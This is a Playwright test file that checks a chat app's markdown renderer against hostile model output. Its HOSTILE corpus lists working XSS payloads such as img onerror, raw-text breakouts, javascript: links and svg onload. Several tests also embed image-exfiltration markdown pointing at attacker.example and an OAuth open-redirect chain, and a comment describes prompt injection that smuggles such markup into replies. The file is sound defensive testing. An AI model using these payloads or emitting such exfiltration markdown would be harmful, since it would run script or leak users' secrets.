import { expect, test, type Page } from '@playwright/test'
import { renderMarkdown } from '../src/lib/chat/chat'
import { renderPreviewMarkdown } from '../src/lib/chat-console/preview-render'
import { SANITIZER_PROBES, sanitizerHolds } from '../src/lib/util/safe-markdown'
import { authenticateContext, cleanupPrefixedRecords, getActiveUserId, seedConversation, uniquePrefix } from './helpers'

/**
 * Model output is rendered as markdown into `{@html}` on a page that can call every remote
 * function as the user. A reply can carry a prompt injection lifted from a web page or a
 * repo, so everything here is written as the attacker would write it.
 *
 * Strings are asserted, and the same HTML is also parsed by a real browser: a sanitizer
 * that looks fine as a string but leaves the parser a live `<img onerror>` is exactly the
 * bug `marked`'s raw-text mode produced.
 */

const PWN = 'window.__pwned=1'

const HOSTILE: Array<[label: string, source: string]> = [
	['raw img onerror', `<img src=x onerror="${PWN}">`],
	['img after inline kbd (raw-text mode)', `<kbd>x <img src=x onerror=${PWN}//`],
	['img after inline code (raw-text mode)', `<code>x <img src=x onerror=${PWN}//`],
	['img after inline pre (raw-text mode)', `<pre>x <img src=x onerror=${PWN}//`],
	['script after inline script tag', `<script>x <img src=x onerror=${PWN}//`],
	['block script', `<script>\n${PWN}\n</script>`],
	['style block', '<style>body { display: none }</style>'],
	['iframe', '<iframe src="javascript:window.__pwned=1"></iframe>'],
	['svg onload', `<svg onload="${PWN}"></svg>`],
	['details ontoggle', `<details open ontoggle="${PWN}"><summary>x</summary></details>`],
	['heading with img', `# <img src=x onerror="${PWN}">`],
	['table cell with img', `| a |\n|---|\n| <img src=x onerror="${PWN}"> |`],
	['javascript link', `[click](javascript:${PWN})`],
	['uppercase javascript link', `[click](JAVASCRIPT:${PWN})`],
	['angle-bracket javascript link', `[click](<javascript:${PWN}>)`],
	['autolink javascript', `<javascript:${PWN}>`],
	['tab-split scheme', `[click](<java\tscript:${PWN}>)`],
	['entity-encoded scheme', `[click](javascript&#58;${PWN})`],
	['data: html link', '[click](data:text/html,<script>window.__pwned=1</script>)'],
	['vbscript link', '[click](vbscript:msgbox(1))'],
	['link title breakout', `[a](https://example.com "t\\" onmouseover=\\"${PWN}")`],
	['image alt breakout', `![a" onerror="${PWN}](/api/upload/x.png)`],
	['attribute on an allowed tag', `<b onclick="${PWN}">bold</b>`],
	['html in a code fence', `\`\`\`html\n<img src=x onerror="${PWN}">\n\`\`\``],
]

/** Parse `html` in a real browser and report anything that could run or leak. */
async function liveHazards(page: Page, html: string) {
	await page.setContent(`<!doctype html><div id="root">${html}</div>`)
	// Give any `onerror` a chance to fire before asking whether it did.
	await page.waitForTimeout(50)
	return page.evaluate(() => {
		const root = document.getElementById('root')!
		const hazards: string[] = []
		for (const el of root.querySelectorAll('*')) {
			const tag = el.tagName.toLowerCase()
			if (['script', 'style', 'iframe', 'object', 'embed', 'svg', 'math', 'form', 'details', 'base', 'meta', 'link'].includes(tag)) {
				hazards.push(`<${tag}>`)
			}
			for (const attr of el.getAttributeNames()) {
				if (attr.startsWith('on')) hazards.push(`${tag}[${attr}]`)
			}
			if (tag === 'a') {
				const href = el.getAttribute('href') ?? ''
				const protocol = new URL(href, 'https://app.invalid/').protocol
				if (!['http:', 'https:', 'mailto:'].includes(protocol)) hazards.push(`a[href=${href}]`)
			}
			if (tag === 'img') {
				const src = el.getAttribute('src') ?? ''
				if (new URL(src, 'https://app.invalid/').origin !== 'https://app.invalid') hazards.push(`img[src=${src}]`)
			}
		}
		if ((window as unknown as { __pwned?: number }).__pwned) hazards.push('script ran')
		return hazards
	})
}

test.describe('chat/markdown — model output cannot run script in our origin', () => {
	for (const [label, source] of HOSTILE) {
		test(`chat renderer: ${label}`, async ({ page }) => {
			const html = renderMarkdown(source)
			expect(html).not.toMatch(/href="\s*(javascript|data|vbscript)/i)
			expect(await liveHazards(page, html)).toEqual([])
		})
	}

	test('the rail renderer holds against the same corpus', async ({ page }) => {
		for (const [label, source] of HOSTILE) {
			const html = await renderPreviewMarkdown(source, { conversationId: 'c1', filePath: 'notes.md' })
			expect(await liveHazards(page, html), label).toEqual([])
		}
	})

	test('both renderers pass the shared self-check probes', async () => {
		// The same probes gate each renderer at module load; if they leaked, the renderer
		// would fall back to plain text and these would still pass, so also check that a
		// normal paragraph is real markup.
		expect(SANITIZER_PROBES.length).toBeGreaterThan(0)
		expect(sanitizerHolds(renderMarkdown)).toBe(true)
		expect(renderMarkdown('**x**')).toContain('<strong>x</strong>')

		const rail = new Map<string, string>()
		for (const { input } of SANITIZER_PROBES) {
			rail.set(input, await renderPreviewMarkdown(input, { conversationId: null, filePath: null }))
		}
		expect(sanitizerHolds((source) => rail.get(source) ?? '')).toBe(true)
		expect(await renderPreviewMarkdown('**x**', { conversationId: null, filePath: null })).toContain('<strong>x</strong>')
	})
})

test.describe('chat/markdown — nothing is fetched without a click', () => {
	test('a remote image becomes a link instead of a request', () => {
		const html = renderMarkdown('![chart](https://attacker.example/?d=SECRET)')
		expect(html).not.toMatch(/<img/i)
		expect(html).toContain('href="https://attacker.example/?d=SECRET"')
		expect(html).toContain('rel="noopener noreferrer nofollow"')
		expect(html).toContain('Image: chart')
	})

	test('protocol-relative and backslash tricks do not count as our origin', () => {
		for (const src of ['//attacker.example/x.png', '/\\attacker.example/x.png', 'https://attacker.example/x.png']) {
			expect(renderMarkdown(`![x](${src})`), src).not.toMatch(/<img/i)
		}
	})

	test('an uploaded image still renders inline', () => {
		expect(renderMarkdown('![shot](/api/upload/abc.png)')).toContain('<img src="/api/upload/abc.png" alt="shot"')
		// Query and fragment are dropped: the upload route reads neither.
		expect(renderMarkdown('![shot](/api/upload/abc.png?v=2#top)')).toContain('<img src="/api/upload/abc.png" alt="shot"')
	})

	/**
	 * Our own origin is not automatically safe to fetch. The GitHub connect route stored an
	 * unchecked `?return=` in a cookie and the callback redirected to it, so one reply with
	 * these two images forwarded a secret to another site with no click. The route is fixed
	 * too (see source-control.oauth.spec.ts), but any other redirecting or state-changing GET
	 * would reopen it, so only the upload route loads inline.
	 */
	test('a same-origin image that is not an upload is a link, not a request', () => {
		for (const src of [
			'/source-control/github/connect?return=https://attacker.example/SECRET',
			'/source-control/github/callback',
			'/api/upload/../../source-control/github/callback',
			'/api/upload/%2e%2e/%2e%2e/source-control/github/callback',
			'/api/preview/raw?conversationId=c1&path=x.png',
			'/settings',
			'api/upload/abc.png',
		]) {
			const html = renderMarkdown(`![x](${src})`)
			expect(html, src).not.toMatch(/<img/i)
			expect(html, src).toContain('class="md-remote-image"')
		}
	})

	test('titles and alt text show entities once, not as literal escapes', () => {
		expect(renderMarkdown('[a](https://example.com "&quot;hi&quot; &amp; bye")')).toContain(
			'title="&quot;hi&quot; &amp; bye"',
		)
		expect(renderMarkdown('![a &amp; b](/api/upload/abc.png)')).toContain('alt="a &amp; b"')
	})
})

test.describe('chat/markdown — ordinary markdown still renders', () => {
	test('code fences keep their highlighting', () => {
		const html = renderMarkdown('```ts\nconst answer: number = 42\n```')
		expect(html).toContain('class="hljs language-ts"')
		expect(html).toContain('<span class="hljs-keyword">const</span>')
		expect(renderMarkdown('`<b>`')).toContain('<code>&lt;b&gt;</code>')
	})

	test('links: external ones open in a new tab without a referrer, internal ones stay put', () => {
		expect(renderMarkdown('[docs](https://example.com/a?b=1&c=2)')).toContain(
			'<a href="https://example.com/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer nofollow">docs</a>',
		)
		expect(renderMarkdown('[settings](/settings)')).toContain('<a href="/settings">settings</a>')
		expect(renderMarkdown('[mail](mailto:a@example.com)')).toContain('<a href="mailto:a@example.com">mail</a>')
		expect(renderMarkdown('see www.example.com')).toContain('href="http://www.example.com"')
	})

	test('a small set of attribute-less formatting tags is kept; anything else is shown as text', () => {
		expect(renderMarkdown('one<br>two')).toContain('one<br>two')
		expect(renderMarkdown('<b>bold</b> and <sup>2</sup>')).toContain('<b>bold</b> and <sup>2</sup>')
		expect(renderMarkdown('| a |\n|---|\n| x<br/>y |')).toContain('x<br>y')
		expect(renderMarkdown('<div class="x">block</div>')).toContain('&lt;div class=&quot;x&quot;&gt;')
		expect(renderMarkdown('<b onclick="x">b</b>')).toContain('&lt;b onclick=&quot;x&quot;&gt;')
	})

	test('entities and plain text survive', () => {
		expect(renderMarkdown('a &rarr; b, 1 < 2 & 3 > 2')).toContain('a &rarr; b, 1 &lt; 2 &amp; 3 &gt; 2')
		expect(renderMarkdown('**bold** _em_ ~~gone~~')).toContain('<strong>bold</strong> <em>em</em> <del>gone</del>')
	})
})

test.describe('chat/markdown — a stored hostile reply on the chat page', () => {
	test('renders as text: no script runs and no remote image is requested', async ({ page }) => {
		test.setTimeout(60_000)
		const prefix = uniquePrefix('md-xss')
		await cleanupPrefixedRecords(prefix)
		await authenticateContext(page.context())

		const remoteRequests: string[] = []
		await page.route((url) => url.hostname === 'attacker.example', (route) => {
			remoteRequests.push(route.request().url())
			return route.abort()
		})
		// The same-origin half of the leak: images that would bounce through the OAuth routes.
		const bounceRequests: string[] = []
		page.on('request', (request) => {
			if (new URL(request.url()).pathname.startsWith('/source-control/github/')) bounceRequests.push(request.url())
		})

		try {
			const conversation = await seedConversation(prefix, {
				userId: await getActiveUserId(),
				assistantMessage: [
					`${prefix} visible marker`,
					'',
					`<img src=x onerror="${PWN}">`,
					'',
					`<kbd>k <img src=x onerror=${PWN}//`,
					'',
					'![leak](https://attacker.example/?d=SECRET)',
					'',
					'![a](/source-control/github/connect?return=https://attacker.example/SECRET2) ![b](/source-control/github/callback)',
					'',
					`[click me](javascript:${PWN})`,
				].join('\n'),
			})

			await page.goto(`/chat/${conversation.id}`, { waitUntil: 'domcontentloaded' })
			const body = page.locator('.markdown-body').filter({ hasText: `${prefix} visible marker` })
			await expect(body).toBeVisible({ timeout: 30_000 })
			// The escaped markup is shown to the reader, which is also the proof it did not parse.
			await expect(body).toContainText('<img src=x onerror=')

			expect(await body.locator('img').count()).toBe(0)
			expect(await body.locator('a[href^="javascript" i]').count()).toBe(0)
			await expect(body.locator('a.md-remote-image[href="https://attacker.example/?d=SECRET"]')).toHaveCount(1)
			await expect(body.locator('a.md-remote-image[href="/source-control/github/callback"]')).toHaveCount(1)
			expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined()
			expect(remoteRequests).toEqual([])
			expect(bounceRequests).toEqual([])
		} finally {
			await cleanupPrefixedRecords(prefix)
		}
	})
})
